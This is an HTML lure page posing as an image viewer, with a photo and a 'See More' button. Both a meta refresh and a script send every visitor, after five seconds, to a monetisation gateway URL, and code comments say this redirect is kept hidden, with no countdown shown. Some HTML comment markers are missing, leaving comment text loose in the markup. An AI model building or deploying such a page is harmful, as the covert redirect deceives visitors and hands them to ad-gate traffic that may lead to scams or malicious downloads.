<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
    <title>Image | See More</title>

     Fallback auto-redirect (hidden, no timer shown) 
    <meta http-equiv="refresh" content="5; url=https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0" />

    <style>
      /* Color system (5 total):
         1) Primary: #e11d48
         2) Neutral bg: #f6f7f9
         3) Neutral text: #0f172a
         4) White: #ffffff
         5) Border: #e5e7eb
      */
      :root {
        --primary: #e11d48;
        --bg: #f6f7f9;
        --text: #0f172a;
        --white: #ffffff;
        --border: #e5e7eb;
      }

      * { box-sizing: border-box; }
      body {
        margin: 0;
        font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
        background: var(--bg);
        color: var(--text);
        min-height: 100dvh;
        display: grid;
        place-items: center;
        padding: 16px;
        line-height: 1.5;
      }

      .card {
        width: 100%;
        max-width: 560px;
        background: var(--white);
        border: 1px solid var(--border);
        border-radius: 14px;
        overflow: hidden;
        box-shadow: 0 10px 24px rgba(0,0,0,0.06);
      }

      .media {
        position: relative;
        aspect-ratio: 3/5;
        background: #ddd;
      }
      .media img {
        position: absolute;
        inset: 0;
        width: 100%;
        height: 100%;
        object-fit: cover;
      }

      .content {
        padding: 16px;
      }

      .btn {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 48px;
        border-radius: 10px;
        background: var(--primary);
        color: #fff;
        text-decoration: none;
        font-weight: 600;
        letter-spacing: 0.2px;
        box-shadow: 0 6px 16px rgba(225, 29, 72, 0.25);
        transition: transform 0.12s ease, box-shadow 0.12s ease, opacity 0.12s ease;
      }
      .btn:active { transform: translateY(1px); box-shadow: 0 4px 10px rgba(225,29,72,0.2); }
    </style>
  </head>
  <body>
    <main class="card" aria-label="Image card">
      <figure class="media">
         Using the provided Source URL 
        <img
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/photo_30_2025-09-02_14-22-31.jpg-9TdZcAWQi6etjaGVbFgwmbpvryGrtJ.jpeg"
          alt="Portrait of a person in a red dress near a mountain lake"
          loading="eager"
        />
      </figure>

      <div class="content">
         Always visible button; works even without JS 
        <a
          id="seeMore"
          class="btn"
          href="https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0"
          aria-label="See More"
        >See More</a>
      </div>
    </main>

    <script>
      (function () {
        const TARGET = "https://www.revenuecpmgate.com/ipkpuuud08?key=1756b02182daa3e03505a06e107f2ba0";
        const link = document.getElementById("seeMore");
        let redirected = false;

        function goSameTab() {
          if (redirected) return;
          redirected = true;
          window.location.href = TARGET; // mobile-friendly
        }

        // Auto-redirect after 5 seconds (hidden, no countdown shown)
        const timer = setTimeout(goSameTab, 5000);

        // If user clicks first, navigate immediately and cancel timer
        link.addEventListener("click", function (e) {
          if (redirected) return;
          clearTimeout(timer);
          // let normal anchor navigation proceed (same tab)
          // If you wanted to force same-tab via JS: e.preventDefault(); goSameTab();
        });

        // Keyboard accessibility (optional redundancy)
        link.addEventListener("keydown", function (e) {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            link.click();
          }
        });
      })();
    </script>
  </body>
</html>
